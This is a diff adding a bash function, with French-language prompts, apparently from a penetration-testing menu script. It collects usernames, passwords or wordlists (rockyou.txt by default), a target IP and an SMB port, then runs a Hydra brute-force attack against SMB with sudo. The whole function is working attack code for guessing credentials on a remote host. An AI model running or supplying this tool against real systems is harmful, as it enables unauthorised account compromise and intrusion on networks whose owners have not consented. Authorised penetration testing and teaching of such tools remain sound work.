@@ -1,0 +1,124 @@
+# 2) Cracker SMB
+smb() {
+gsmb
+echo
+# >>> Saisi Utilisateur
+        echo
+        read -p "          Avez-vous le nom d'utilisateur ? [${v}oui${reset}/${r}non${reset}] : " oui_user
+        if [ "$oui_user" = "oui" ]; then
+                read -p "          Veuillez saisir le nom d'utilisateur : " user
+        elif [ "$oui_user" = "non" ]; then
+
+        # Demande dictionnaire pour utilisateur
+                read -p "          Souhaitez-vous utiliser votre propre dictionnaire pour le nom d'utilisateur ? [${v}oui${reset}/${r}non${reset}] : " use_custom_user_dict
+                if [ "$use_custom_user_dict" = "oui" ]; then
+                        get_custom_user_dict
+                        user_command="-L $custom_user_dict"
+                else
+                        rockyou="/usr/share/wordlists/rockyou.txt"
+                verif_rockyou
+                fi
+        else
+                clear
+                echo "          ${r}Réponse non valide, retour au menu principal${reset}"
+                entree
+        fi
+
+# >>> Saisi mot de passe
+        gsmb
+        echo
+        echo
+        read -p "          Avez-vous le mot de passe ? [${v}oui${reset}/${r}non${reset}] : " oui_pass
+        if [ "$oui_pass" = "oui" ]; then
+                read -p "          Veuillez saisir le mot de passe : " pass
+        elif [ "$oui_pass" = "non" ]; then
+
+        # Demande dictionnaire mot de passe
+                read -p "          Souhaitez-vous utiliser votre propre dictionnaire pour le mot de passe ? [${v}oui${reset}/${r}non${reset}] : " use_custom_pass_dict
+                if [ "$use_custom_pass_dict" = "oui" ]; then
+                        get_custom_pass_dict
+                        pass_command="-P $custom_pass_dict"
+                else
+                        rockyou="/usr/share/wordlists/rockyou.txt"
+                verif_rockyou
+                fi
+        else
+                clear
+                echo "          ${r}Réponse non valide, retour au menu principal${reset}"
+                entree
+        fi
+
+        ##### Vérification utilisateur et mot de passe connu #####
+                if [ -n "$user" ] && [ -n "$pass" ]; then
+                        echo
+                        echo "          ${r}Si vous avez le nom d'utilisateur et le mot de passe, que cherchez-vous alors ?${reset}"
+                        echo
+                        echo "          Retour au menu principal"
+                        echo
+                        entree
+                        exit 1
+                fi
+
+# >>> Saisi IP cible
+        gsmb
+        echo
+        echo
+        read -p "          Veuillez saisir l'IP de la cible : " ip
+
+        ##### Vérif cible en ligne #####
+                if ! sudo ping -c 1 -w 1 "$ip" > /dev/null 2>&1; then
+                        echo
+                        echo "          ${r}La cible n'est pas en ligne, retour au menu principal${reset}"
+                        echo
+                        entree
+                fi
+
+# >>> Saisi port
+        gsmb
+        echo
+        echo
+        read -p "          Saisissez le numéro de port (445 par défaut): " port
+
+        ##### Vérif si port valide #####
+                while ! [[ "$port" =~ ^[0-9]*$ && ( "$port" -ge 1 && "$port" -le 65536 || -z "$port" ) ]]; do
+                        echo "          ${r}Veuillez saisir un numéro de port valide entre 1 et 65536${reset}"
+                        echo
+                        read -p "          Saisir le numéro de port (445 par défaut): " port
+                done
+
+        # Validation port par défaut
+                if [ -z "$port" ]; then
+                        port=445
+                fi
+
+# Génération des commandes
+        port_command="-s $port"
+
+        if [ -n "$user" ]; then
+                user_command="-l $user"
+        elif [ -n "$custom_user_dict" ]; then
+                user_command="-L $custom_user_dict"
+        else
+                user_command="-L $rockyou"
+        fi
+
+        if [ -n "$pass" ]; then
+                pass_command="-p $pass"
+        elif [ -n "$custom_pass_dict" ]; then
+                pass_command="-P $custom_pass_dict"
+        else
+                pass_command="-P $rockyou"
+        fi
+
+# Commande finale
+        gsmb
+        echo
+        echo
+        echo
+        echo "          ${v}Exécution de la commande : hydra -t 4 $user_command $pass_command $port_command -f $ip smb${reset}"
+        echo
+        echo
+        sudo hydra -t 4 $user_command $pass_command $port_command -f $ip smb
+        echo
+        entree
+}
